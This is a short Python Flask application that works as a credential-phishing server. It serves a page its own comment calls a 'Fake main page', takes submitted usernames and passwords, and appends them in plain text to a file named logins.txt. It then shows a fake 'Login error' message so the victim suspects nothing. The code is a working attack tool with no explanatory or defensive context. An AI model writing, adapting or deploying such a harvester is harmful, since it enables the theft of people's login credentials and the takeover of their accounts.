from flask import Flask, request, render_template


app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')  # Fake main page


@app.route('/process_login', methods=['POST'])
def process_login():
    username = request.form['username']
    password = request.form['password']
    with open('logins.txt', 'a') as f:
        f.write(f"{username}:{password}\n")
    return "Login error. Please try again."


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
